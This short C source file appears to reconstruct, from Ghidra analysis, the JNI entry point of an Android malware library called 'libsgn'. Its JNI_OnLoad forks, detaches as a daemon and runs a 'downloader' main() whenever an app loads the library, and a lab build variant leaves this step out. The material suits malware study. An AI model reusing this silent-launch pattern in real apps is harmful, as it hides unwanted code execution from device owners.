/*
 * libsgn JNI entry — variant-2 Java System.load() after asset copy
 * Ghidra: JNI_OnLoad @ 0x00002100
 * fork → daemon(0,0) → main. Returns JNI_VERSION_1_6.
 */

#include "strings.h"

#ifdef __ANDROID__

#include <jni.h>
#include <unistd.h>

extern int main(void);

jint JNI_OnLoad(JavaVM *vm, void *reserved)
{
    (void)vm;
    (void)reserved;

    if (fork() == 0) {
        daemon(0, 0);
        main();
    }
    return JNI_VERSION_1_6;
}

#else

/* Host/lab: JNI_OnLoad is omitted; downloader entry is main(). */
int libsgn_jni_version(void)
{
    return LIBSGN_JNI_VERSION_1_6;
}

#endif
